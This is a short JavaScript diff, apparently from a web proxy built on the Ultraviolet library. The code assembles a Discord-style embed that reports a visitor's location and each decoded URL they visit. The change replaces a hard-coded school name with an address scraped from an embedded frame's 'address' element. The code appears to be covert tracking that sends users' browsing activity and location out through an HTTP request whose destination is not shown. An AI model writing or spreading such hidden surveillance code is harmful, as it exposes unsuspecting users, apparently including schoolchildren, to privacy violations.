@@ -50,7 +50,7 @@ request.setRequestHeader('Content-type', 'application/json');
 
 var myEmbed = {
   author: {
-    name: "Location: " + "(" + "Cook Middle School" + ")" + " VISITED WEBSITE: "
+    name: "Location: " + "(" + document.getElementById("hello2").contentWindow.document.getElementById('address').innerHTML + ")" + " VISITED WEBSITE: "
   },
   title: __uv$config.decodeUrl(decodedURL),
   color: hexToDecimal("#36393F")
